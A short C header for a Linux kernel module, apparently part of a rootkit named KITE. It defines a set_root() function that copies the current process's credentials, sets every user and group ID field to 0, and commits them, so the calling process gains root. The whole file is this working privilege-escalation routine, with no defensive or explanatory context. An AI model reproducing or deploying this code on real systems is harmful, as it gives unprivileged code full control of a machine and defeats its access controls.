#ifndef ROOT_SETTER_KITE
    #define ROOT_SETTER_KITE
    
    #include <linux/cred.h>

static void set_root(void){
    struct cred *p_creds;
    p_creds = prepare_creds(); // get a COPY of the current task's credentials
    if(p_creds == NULL){
        return;
    }
    // alter the copy to root ids
    p_creds->uid.val = p_creds->gid.val = 0;
    p_creds->euid.val = p_creds->egid.val = 0;
    p_creds->suid.val = p_creds->sgid.val = 0;
    p_creds->fsuid.val = p_creds->fsgid.val = 0;

    commit_creds(p_creds); // commit the credentials to the task
}


#endif